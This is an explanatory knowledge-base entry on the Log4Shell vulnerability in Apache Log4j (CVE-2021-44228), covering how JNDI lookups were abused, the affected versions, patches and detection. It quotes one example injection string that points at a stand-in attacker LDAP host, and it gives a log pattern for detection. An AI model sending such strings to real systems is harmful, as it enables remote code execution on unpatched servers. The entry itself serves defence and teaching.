# Log4Shell

## What it is
Imagine a hotel concierge who, when you hand them a note that says "look up room 404," actually *goes to room 404* instead of treating it as just text. Log4Shell (CVE-2021-44228) is a critical remote code execution vulnerability in Apache Log4j where the logging library would parse and execute attacker-controlled JNDI lookup strings embedded in logged input, such as `${jndi:ldap://attacker.com/exploit}`.

## Why it matters
In December 2021, attackers embedded malicious JNDI strings into User-Agent HTTP headers, knowing web servers would log them. Vulnerable Log4j instances would then reach out to attacker-controlled LDAP servers, download a malicious Java class, and execute it — achieving RCE with zero authentication required on systems ranging from Minecraft servers to enterprise VMware products.

## Key facts
- **CVSS Score: 10.0 (Critical)** — maximum severity; affected Log4j versions 2.0-beta9 through 2.14.1
- **Attack vector**: Any user-controlled input that gets logged — HTTP headers, usernames, search fields — becomes a potential injection point
- **JNDI (Java Naming and Directory Interface)** is the mechanism exploited; it allows Java apps to look up data from remote directories like LDAP
- **Remediation**: Patched in Log4j 2.15.0 (then 2.16.0 for bypass); mitigations include setting `log4j2.formatMsgNoLookups=true` or removing the `JndiLookup` class
- **Detection**: Look for outbound LDAP/RMI traffic from unexpected hosts or strings like `${jndi:` in web server logs

## Related concepts
[[Remote Code Execution]] [[JNDI Injection]] [[Supply Chain Vulnerability]] [[CVE Scoring]] [[Intrusion Detection]]